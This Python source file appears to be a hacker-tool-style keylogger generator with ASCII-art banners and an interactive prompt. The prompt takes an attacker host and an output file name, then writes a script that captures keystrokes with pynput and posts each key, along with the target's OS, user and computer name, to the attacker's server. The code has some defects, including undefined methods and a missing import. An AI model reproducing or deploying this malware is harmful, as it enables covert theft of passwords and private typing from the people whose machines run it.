import subprocess
import os
import platform
import requests
import random
import colorama

Banner1 = """

 _    _            _                 _  __          
| |  | |          | |               | |/ /          
| |__| | __ _  ___| | _____ _ __ ___| ' / ___ _   _ 
|  __  |/ _` |/ __| |/ / _ \ '__/ __|  < / _ \ | | |
| |  | | (_| | (__|   <  __/ |  \__ \ . \  __/ |_| |
|_|  |_|\__,_|\___|_|\_\___|_|  |___/_|\_\___|\__, |
                                               __/ |
                                              |___/ 

"""

Banner2 = """


db   db  .d8b.   .o88b. db   dD d88888b d8888b. .d8888. db   dD d88888b db    db
88   88 d8' `8b d8P  Y8 88 ,8P' 88'     88  `8D 88'  YP 88 ,8P' 88'     `8b  d8'
88ooo88 88ooo88 8P      88,8P   88ooooo 88oobY' `8bo.   88,8P   88ooooo  `8bd8' 
88~~~88 88~~~88 8b      88`8b   88~~~~~ 88`8b     `Y8b. 88`8b   88~~~~~    88   
88   88 88   88 Y8b  d8 88 `88. 88.     88 `88. db   8D 88 `88. 88.        88   
YP   YP YP   YP  `Y88P' YP   YD Y88888P 88   YD `8888Y' YP   YD Y88888P    YP   
                                                                                
                                                                                

"""

Banner3 = """

 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ 
||H |||a |||c |||k |||e |||r |||Z |||k |||e |||y ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|



"""

Banner4 = """
██╗   ██╗███████╗██╗███╗   ██╗ ██████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗   ██╗
██║   ██║██╔════╝██║████╗  ██║██╔════╝     ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚██╗ ██╔╝
██║   ██║███████╗██║██╔██╗ ██║██║  ███╗    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝███████╗█████╔╝ █████╗   ╚████╔╝ 
██║   ██║╚════██║██║██║╚██╗██║██║   ██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗╚════██║██╔═██╗ ██╔══╝    ╚██╔╝  
╚██████╔╝███████║██║██║ ╚████║╚██████╔╝    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║███████║██║  ██╗███████╗   ██║   
 ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   
                                                                                                                            
██╗███████╗    ████████╗██╗  ██╗███████╗    ███████╗ █████╗ ███╗   ███╗███████╗     █████╗ ███████╗                         
██║██╔════╝    ╚══██╔══╝██║  ██║██╔════╝    ██╔════╝██╔══██╗████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╗                      
██║███████╗       ██║   ███████║█████╗      ███████╗███████║██╔████╔██║█████╗      ███████║███████╗╚═╝                      
██║╚════██║       ██║   ██╔══██║██╔══╝      ╚════██║██╔══██║██║╚██╔╝██║██╔══╝      ██╔══██║╚════██║██╗                      
██║███████║       ██║   ██║  ██║███████╗    ███████║██║  ██║██║ ╚═╝ ██║███████╗    ██║  ██║███████║╚═╝                      
╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝                         
                                                                                                                            
██████╗ ██╗   ██╗███╗   ██╗███╗   ██╗██╗   ██╗███╗   ██╗ ██████╗                                                            
██╔══██╗██║   ██║████╗  ██║████╗  ██║██║   ██║████╗  ██║██╔════╝ ██╗                                                        
██████╔╝██║   ██║██╔██╗ ██║██╔██╗ ██║██║   ██║██╔██╗ ██║██║  ███╗╚═╝                                                        
██╔══██╗██║   ██║██║╚██╗██║██║╚██╗██║██║   ██║██║╚██╗██║██║   ██║██╗                                                        
██║  ██║╚██████╔╝██║ ╚████║██║ ╚████║╚██████╔╝██║ ╚████║╚██████╔╝╚═╝                                                        
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝                                                            
                                                                                                                            
       ██╗██╗ █████╗ ███╗   ███╗ █████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗    ███████╗██╗  ██╗                 
      ██╔╝██║██╔══██╗████╗ ████║██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗   ██╔════╝██║  ██║                 
     ██╔╝ ██║███████║██╔████╔██║███████║███████║███████║██║     █████╔╝ █████╗  ██████╔╝   ███████╗███████║                 
    ██╔╝  ██║██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗   ╚════██║██╔══██║                 
██╗██╔╝   ██║██║  ██║██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██╗███████║██║  ██║                 
╚═╝╚═╝    ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝                 
                                                                                                                                                                                                                                  
"""
class KeyloggerWriter:
	
	def __init__(self, file_name, server_ip, report_interval=None):
		
		self.file_name = file_name
		self.report_interval = report_interval
		self.SystemReport = ""
		self.File = open(file_name, "w")
		self.server_ip = server_ip
		self.server_connected_flag = 0
		
		self.SystemReportFunc = """

	def get_system_info(self):
		
			uname = platform.uname()
			os = uname[0] + " " + uname[2] + " " + uname[3]
			computer_name = uname[1]
			user = getpass.getuser()
			self.SystemReport = "Target os: "+os + " Active user: "+user + " Computer name: "+ computer_name


"""

	
	def KeyloggerClassWriter(self):
		
		self.File.write("import requests, os, pynput.keyboard\n")
		self.File.write("class Keylogger:")
		self.File.write("""
	def __init__(self):
		self.UrlToFollow = '{}'
		self.start()
		""".format(self.server_ip))
		self.File.write(self.SystemReportFunc)
	
	def SendFuctionWriter(self):
		
		self.File.write("""
		
	def report_keys_to_server(self, key):
		requests.post(self.UrlToFollow, data={'Captured':key})
		
		""")
		
	def StartFunctionWriter(self):
		self.File.write("""
		
	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.report_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()

		""")
from os import system, name 
		
def clear(): 
   
    if name == 'nt': 
        _ = system('cls') 
  
    else: 
        _ = system('clear') 

print(random.choice([Banner1, Banner2, Banner3, Banner4]))

from colorama import Fore, Back, Style, init
init()

server_ip = None
file_name = None

print("""
[ 2 Options 
[ Type 'list opt' to List the options                              ]
[ Type 'set ' and then your option. Example : 'set lhost=10.0.0.1' ]
[ 2 options are 'lhost' and 'out_name'                             ]
[ Type 'generate' to generate the python script                    ]


Once Done start the server with ./StartServer.sh
""")

while True:
	
	displayer = 'Hacker_Z_Key_User > '
	option = input(displayer)
	
	if option == ' ' or option == '\n' or option == '':
		
		continue
		
	elif "exit" in option: quit()
	
	elif 'set' in option:
		
		option = option.split('set ')[1]
		option = option.split('=')
		
		if option[0] == 'lhost':
			
			server_ip = option[1]
		elif option[0] == 'out_name':
			
			file_name = option[1]
	elif "list opt" in option:
		
		print(f"""
		
		
		[ LHOST : {server_ip}    ]
		[ FILENAME : {file_name} ]
		
		
		
		""")
		
	elif "clear" in option:
		
		clear()
		
	elif "generate" in option:
		
		print("[" + Fore.BLUE + "*" + Style.RESET_ALL + "]" + "  Attempting to start Generator ...")
		
		try:
		
			writer = KeyloggerWriter(str(file_name), str(server_ip))
			print("[" + Fore.GREEN + "-" + Style.RESET_ALL + "]" + "  File Created! \n\n")
			writer.KeyloggerClassWriter()
			writer.SendFuctionWriter()
			writer.StartFunctionWriter()
			
			print("[" + Fore.GREEN + "-" + Style.RESET_ALL + "]" + "  Done.... \n\n")
			
			
		except:
			
			print("[" + Fore.RED + "-" + Style.RESET_ALL + "]" + " UN UNEXPECTED ERROR CAME! RESETTING OPTIONS....\n\n")
			server_ip = None
			file_name=None
			file_name=None
			
	elif "exploit" in option:
		
		print("\n\n[" + Fore.BLUE + "*" + Style.RESET_ALL + "]" + "  Attempting to start Generator ...")
		print("\n\nExploit is still a feature request and not yet usable\n\n")
		
	else:
		print("[" + Fore.BLUE + "*" + Style.RESET_ALL + "]" + "  Attempting to start Generator ...")
		print("[" + Fore.RED + "-" + Style.RESET_ALL + "]" + "  INVALID OPTION! \n\n")
